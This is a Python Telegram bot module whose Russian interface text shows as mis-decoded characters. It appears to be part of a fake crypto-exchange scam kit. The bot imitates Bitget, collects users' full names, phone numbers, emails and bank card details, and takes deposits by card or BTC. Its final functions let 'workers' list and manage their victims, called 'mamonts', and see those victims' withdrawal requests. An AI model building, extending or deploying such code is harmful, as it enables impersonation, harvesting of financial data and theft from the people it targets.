import generates
import sqlite3
from telebot import types
from generates import *




def send_cabinet(bot, call, called=True):

    keyboard = types.InlineKeyboardMarkup()

    button1 = types.InlineKeyboardButton(text="üñ•–õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç", callback_data='cabinet')
    button2 = types.InlineKeyboardButton(text="üìà–ö—É–ø–∏—Ç—å –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç—É", callback_data='buy crypto')
    keyboard.add(button1)
    keyboard.add(button2)

    buttons = [
        types.InlineKeyboardButton(text="üí≥–ü–æ–ø–æ–ª–Ω–∏—Ç—å", callback_data='deposit'),
        types.InlineKeyboardButton(text="üè¶–í—ã–≤–µ—Å—Ç–∏ –∞–∫—Ç–∏–≤—ã", callback_data='withdraw'),
        types.InlineKeyboardButton(text="üõ†–ù–∞—Å—Ç—Ä–æ–π–∫–∏", callback_data='settings'),
        types.InlineKeyboardButton(text="‚ÑπÔ∏è–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –Ω–∞—Å", callback_data='info'),
        types.InlineKeyboardButton(text="‚öôÔ∏è–¢–µ—Ö.–ø–æ–¥–¥–µ—Ä–∂–∫–∞", callback_data='support', url="https://t.me/Bit_GetSupport")
    ]

    keyboard.row(*buttons[0:2])
    keyboard.row(*buttons[2:4])
    keyboard.add(buttons[4])

    photo = open("cabinet.jpg", "rb")

    if called:
        bot.send_photo(call.message.chat.id, photo, caption=generate_cabinet_text(str(call.from_user.id)), reply_markup=keyboard)
    else:
        bot.send_photo(call.chat.id, photo, caption=generate_cabinet_text(str(call.from_user.id)), reply_markup=keyboard)
    
    photo.close()


def send_info(bot, call, called=True):

    keyboard = types.InlineKeyboardMarkup()

    button1 = types.InlineKeyboardButton(text="üîÜ–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Ä–µ–∑–µ—Ä–≤–æ–≤", callback_data='proof of reserves', url="https://www.bitget.com/ru/proof-of-reserves")
    button2 = types.InlineKeyboardButton(text="üîÜ–ì–∞—Ä–∞–Ω—Ç–∏—è —Å–µ—Ä–≤–∏—Å–∞", callback_data='guarantee')
    keyboard.add(button1, button2)

    button3 = types.InlineKeyboardButton(text="üîÜC–æ—Å—Ç–æ—è–Ω–∏–µ —Å–µ—Ç–∏", callback_data='network status')
    button4 = types.InlineKeyboardButton(text="üîÜ–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ", callback_data='more info', url="https://ru.beincrypto.com/exchanges/bitget/")
    keyboard.add(button3, button4)
    button5 = types.InlineKeyboardButton(text="–í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç", callback_data='cabinet')
    keyboard.add(button5)

    photo = open("info.jpg", "rb")

    if called:
        bot.send_photo(call.message.chat.id, photo, caption="–í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â—É—é –≤–∞—Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é:", reply_markup=keyboard)
    else:
        bot.send_photo(call.chat.id, photo, caption="–í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â—É—é –≤–∞—Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é:", reply_markup=keyboard)
    photo.close()


def send_guarantee(bot, call, called=True):
    keyboard = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="–ù–∞–∑–∞–¥", callback_data='info')
    keyboard.add(button)

    photo = open("info.jpg", "rb")
    bot.send_photo(call.message.chat.id, photo, caption=generate_guarantee(), reply_markup=keyboard)
    photo.close()


def send_status(bot, call, called=True):
    keyboard = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="–ù–∞–∑–∞–¥", callback_data='info')
    keyboard.add(button)

    photo = open("info.jpg", "rb")
    bot.send_photo(call.message.chat.id, photo, caption=generate_status(), reply_markup=keyboard)
    photo.close()


def send_settings(bot, call, called=True):
    keyboard = types.InlineKeyboardMarkup()


    button1 = types.InlineKeyboardButton(text="üë§–£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –§.–ò.–û", callback_data='set FIO')
    keyboard.add(button1)

    button2 = types.InlineKeyboardButton(text="üåç–£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Å—Ç—Ä–∞–Ω—É", callback_data='set country')
    button3 = types.InlineKeyboardButton(text="üì™–£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å email", callback_data='set email')
    keyboard.add(button2, button3)

    button4 = types.InlineKeyboardButton(text="üì±–£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –Ω–æ–º–µ—Ä", callback_data='set number')
    button5 = types.InlineKeyboardButton(text="üí≥–£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∫–∞—Ä—Ç—É", callback_data='set card')
    keyboard.add(button4, button5)

    button6 = types.InlineKeyboardButton(text="üõ†–¢–µ—Ö.–ø–æ–¥–¥–µ—Ä–∂–∫–∞", callback_data='get support')
    keyboard.add(button6)

    button7 = types.InlineKeyboardButton(text="üîô–í—ã–π—Ç–∏ –∏–∑ –º–µ–Ω—é –Ω–∞—Å—Ç—Ä–æ–µ–∫", callback_data='cabinet')
    keyboard.add(button7)

    photo = open("settings.jpg", "rb")
    bot.send_photo(call.message.chat.id, photo, caption=generate_settings(str(call.from_user.id)), reply_markup=keyboard)
    photo.close()


def send_get_support(bot, call, called=True):
    keyboard = types.InlineKeyboardMarkup()

    button1 = types.InlineKeyboardButton(text="–ù–∞–ø–∏—Å–∞—Ç—å", url="https://t.me/Bit_GetSupport")
    button2 = types.InlineKeyboardButton(text="‚öôÔ∏è–í–µ—Ä–Ω—É—Ç—å—Å—è –∫ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞–º", callback_data='settings')
    keyboard.add(button1, button2)

    photo = open("settings.jpg", "rb")
    bot.send_photo(call.message.chat.id, photo, caption=generate_get_support(), reply_markup=keyboard)
    photo.close()


def send_set_FIO(bot, call, called=True):
    keyboard = types.InlineKeyboardMarkup()

    button = types.InlineKeyboardButton(text="‚úñÔ∏è–û—Ç–º–µ–Ω–∞", callback_data='settings')
    keyboard.add(button)

    bot.send_message(call.message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –≤–∞—à–µ –ø–æ–ª–Ω–æ–µ –§.–ò.–û (–§–∞–º–∏–ª–∏—è –ò–º—è –û—Ç—á–µ—Å—Ç–≤–æ):", reply_markup=keyboard)

def send_after_set_FIO(bot, call, FIO):
    keyboard = types.InlineKeyboardMarkup()

    button2 = types.InlineKeyboardButton(text="üñ•–í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç", callback_data='cabinet')
    keyboard.add(button2)

    button1 = types.InlineKeyboardButton(text="‚öôÔ∏è–í–µ—Ä–Ω—É—Ç—å—Å—è –∫ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞–º", callback_data='settings')
    keyboard.add(button1)

    bot.send_message(call.chat.id, f"–≤–∞—à–µ –§.–ò.–û: {FIO}", reply_markup=keyboard)

def send_set_country(bot, call, called=True):
    keyboard = types.InlineKeyboardMarkup()

    button = types.InlineKeyboardButton(text="‚úñÔ∏è–û—Ç–º–µ–Ω–∞", callback_data='settings')
    keyboard.add(button)

    bot.send_message(call.message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –≤–∞—à—É —Å—Ç—Ä–∞–Ω—É:", reply_markup=keyboard)



def send_after_set_country(bot, call, country):
    keyboard = types.InlineKeyboardMarkup()

    button2 = types.InlineKeyboardButton(text="üñ•–í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç", callback_data='cabinet')
    keyboard.add(button2)

    button1 = types.InlineKeyboardButton(text="‚öôÔ∏è–í–µ—Ä–Ω—É—Ç—å—Å—è –∫ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞–º", callback_data='settings')
    keyboard.add(button1)

    bot.send_message(call.chat.id, f"–≤–∞—à–∞ —Å—Ç—Ä–∞–Ω–∞: {country}", reply_markup=keyboard)


def send_set_email(bot, call, called=True):
    keyboard = types.InlineKeyboardMarkup()

    button = types.InlineKeyboardButton(text="‚úñÔ∏è–û—Ç–º–µ–Ω–∞", callback_data='settings')
    keyboard.add(button)

    bot.send_message(call.message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –≤–∞—à email:", reply_markup=keyboard)



def send_after_set_email(bot, call, email):
    keyboard = types.InlineKeyboardMarkup()

    button2 = types.InlineKeyboardButton(text="üñ•–í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç", callback_data='cabinet')
    keyboard.add(button2)

    button1 = types.InlineKeyboardButton(text="‚öôÔ∏è–í–µ—Ä–Ω—É—Ç—å—Å—è –∫ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞–º", callback_data='settings')
    keyboard.add(button1)

    bot.send_message(call.chat.id, f"–≤–∞—à email: {email}", reply_markup=keyboard)


def send_set_card(bot, call, called=True):
    keyboard = types.InlineKeyboardMarkup()

    button = types.InlineKeyboardButton(text="‚úñÔ∏è–û—Ç–º–µ–Ω–∞", callback_data='settings')
    keyboard.add(button)

    bot.send_message(call.message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –≤–∞—à—É –∫–∞—Ä—Ç—É:", reply_markup=keyboard)



def send_after_set_card(bot, call, email):
    keyboard = types.InlineKeyboardMarkup()

    button2 = types.InlineKeyboardButton(text="üñ•–í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç", callback_data='cabinet')
    keyboard.add(button2)

    button1 = types.InlineKeyboardButton(text="‚öôÔ∏è–í–µ—Ä–Ω—É—Ç—å—Å—è –∫ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞–º", callback_data='settings')
    keyboard.add(button1)

    bot.send_message(call.chat.id, f"–≤–∞—à–∞ –∫–∞—Ä—Ç–∞: {email}", reply_markup=keyboard)



def send_set_number(bot, call, called=True):
    keyboard = types.InlineKeyboardMarkup()

    button = types.InlineKeyboardButton(text="‚úñÔ∏è–û—Ç–º–µ–Ω–∞", callback_data='settings')
    keyboard.add(button)

    bot.send_message(call.message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä:", reply_markup=keyboard)



def send_after_set_number(bot, call, email):
    keyboard = types.InlineKeyboardMarkup()

    button2 = types.InlineKeyboardButton(text="üñ•–í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç", callback_data='cabinet')
    keyboard.add(button2)

    button1 = types.InlineKeyboardButton(text="‚öôÔ∏è–í–µ—Ä–Ω—É—Ç—å—Å—è –∫ –Ω–∞—Å—Ç—Ä–æ–π–∫–∞–º", callback_data='settings')
    keyboard.add(button1)

    bot.send_message(call.chat.id, f"–≤–∞—à –Ω–æ–º–µ—Ä: {email}", reply_markup=keyboard)


def send_deposit(bot, call):
    keyboard = types.InlineKeyboardMarkup()

    button1 = types.InlineKeyboardButton(text="üí≥–ü–æ–ø–æ–ª–Ω–∏—Ç—å —á–µ—Ä–µ–∑ –±–∞–Ω–∫–æ–≤—Å–∫—É—é –∫–∞—Ä—Ç—É", callback_data='deposit card')
    keyboard.add(button1)

    button2 = types.InlineKeyboardButton(text="üí±–ü–æ–ø–æ–ª–Ω–∏—Ç—å —á–µ—Ä–µ–∑ BTC", callback_data='deposit btc')
    keyboard.add(button2)

    button3 = types.InlineKeyboardButton(text="üñ•–í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç", callback_data='cabinet')
    keyboard.add(button3)

    photo = open("deposit.jpg", "rb")
    bot.send_photo(call.message.chat.id, photo, caption="–í—ã–±–µ—Ä–∏—Ç–µ –ø–ª–∞—Ç–µ–∂–Ω—É—é —Å–∏—Å—Ç–µ–º—É –¥–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞", reply_markup=keyboard)
    photo.close()

def send_deposit_card(bot, call):
    keyboard = types.InlineKeyboardMarkup()

    button = types.InlineKeyboardButton(text="–í–µ—Ä–Ω—É—Ç—å—Å—è –∫ –≤—ã–±–æ—Ä—É –ø–ª–∞—Ç–µ–∂–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã", callback_data='deposit')
    keyboard.add(button)

    photo = open("deposit.jpg", "rb")
    bot.send_photo(call.message.chat.id, photo, caption=generate_deposit_card(call.from_user.id), reply_markup=keyboard)
    photo.close()

def send_deposit_bitcoin(bot, call):
    keyboard = types.InlineKeyboardMarkup()

    button = types.InlineKeyboardButton(text="–í–µ—Ä–Ω—É—Ç—å—Å—è –∫ –≤—ã–±–æ—Ä—É –ø–ª–∞—Ç–µ–∂–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã", callback_data='deposit')
    keyboard.add(button)

    photo = open("deposit.jpg", "rb")
    bot.send_photo(call.message.chat.id, photo, caption=generate_deposit_bitcoin(), reply_markup=keyboard)
    photo.close()

def send_buy(bot, call):
    keyboard = types.InlineKeyboardMarkup()

    l = ['BTC', 'ETH', 'XRP', 'EOS', 'BCH', 'LTC', 'ADA', 'ETC', 'LINK', 'TRX', 'DOT', 'DOGE', 'SOL', 'MATIC', 'BNB', 'UNI', 'ICP', 'AAVE', 'FIL', 'XLM']
    for i in range(0,len(l),2):
        button1 = types.InlineKeyboardButton(text=l[i], callback_data=l[i])
        button2 = types.InlineKeyboardButton(text=l[i+1], callback_data=l[i+1])
        keyboard.add(button1, button2)
    
    button = types.InlineKeyboardButton(text="üîô–í–µ—Ä–Ω—É—Ç—å—Å—è –≤ –ª–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç", callback_data='cabinet')
    keyboard.add(button)

    bot.send_message(call.message.chat.id, "üåï –í—ã–±–µ—Ä–∏—Ç–µ –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç—É –¥–ª—è –¥–∞–ª—å–Ω–µ–π—à–µ–π —Ç–æ—Ä–≥–æ–≤–ª–∏:", reply_markup=keyboard)
    

def send_buy_exact(bot, call):
    keyboard = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(text="‚úñÔ∏è–û—Ç–º–µ–Ω–∞", callback_data='buy crypto')
    keyboard.add(button)

    bot.send_message(call.message.chat.id, generate_buy(call.data, call.from_user.id), reply_markup=keyboard)

def send_buy_error(bot, call):
    keyboard = types.InlineKeyboardMarkup()

    button = types.InlineKeyboardButton(text="üîô–í–µ—Ä–Ω—É—Ç—å—Å—è –∫ —Å–ø–∏—Å–∫—É", callback_data='buy crypto')
    keyboard.add(button)

    bot.send_message(call.chat.id, "‚ùå–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤–≤–æ–¥–µ –¥–∞–Ω–Ω—ã—Ö", reply_markup=keyboard)

def send_buy_success(bot, call):
    keyboard = types.InlineKeyboardMarkup()

    button = types.InlineKeyboardButton(text="üîô–í–µ—Ä–Ω—É—Ç—å—Å—è –∫ —Å–ø–∏—Å–∫—É", callback_data='buy crypto')
    keyboard.add(button)

    bot.send_message(call.chat.id, "‚úÖ–ü–æ–∫—É–ø–∫–∞ –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ", reply_markup=keyboard)




def send_text(bot, call, buttons, text, called=True):
    keyboard = types.InlineKeyboardMarkup()

    for i in buttons:
        temp = []
        for j in i:
            temp.append(types.InlineKeyboardButton(text=j[0], callback_data=j[1]))
        
        keyboard.add(*temp)
    
    if called:
        bot.send_message(call.message.chat.id, text, reply_markup=keyboard)
    else:
        bot.send_message(call.chat.id, text, reply_markup=keyboard)




def send_mamonts(bot, call, user_id):
    keyboard = types.InlineKeyboardMarkup()

    refs_list = load_refs()

    any_refs = user_id in refs_list

    if any_refs:
        refs  = refs_list[user_id]
        for ref in refs:
            chat_info = bot.get_chat(ref)
            if chat_info.last_name is None:
                username = chat_info.first_name
            else:
                username = chat_info.first_name + chat_info.last_name

            keyboard.add(types.InlineKeyboardButton(f"ü¶£{username} -- {ref}", callback_data= "manage mamont " + str(ref)))
        
        keyboard.add(types.InlineKeyboardButton(f"–û–±—Ä–∞—Ç–Ω–æ –≤ –º–µ–Ω—é", callback_data="working"))
        bot.send_message(call.message.chat.id, "–°–ø–∏—Å–æ–∫ –º–∞–º–æ–Ω—Ç–æ–≤", reply_markup=keyboard)
    else:

        keyboard.add(types.InlineKeyboardButton(f"–û–±—Ä–∞—Ç–Ω–æ –≤ –º–µ–Ω—é", callback_data="working"))
        bot.send_message(call.message.chat.id, "–£ –≤–∞—Å –Ω–µ—Ç –º–∞–º–æ–Ω—Ç–æ–≤", reply_markup=keyboard)




def send_withdrawal_request(bot, ref, amount, success):
    
    refs = load_refs()
    keyboard = types.InlineKeyboardMarkup()

    keyboard.add(types.InlineKeyboardButton("–ü–µ—Ä–µ–π—Ç–∏ –∫ –º–µ–Ω—é –º–∞–º–æ–Ω—Ç–∞", callback_data= "manage mamont " + str(ref)))

    for worker in refs.keys():
        if ref in refs[worker]:
            bot.send_message(int(worker), generate_withdraw_worker(bot, ref, amount, success), reply_markup=keyboard)



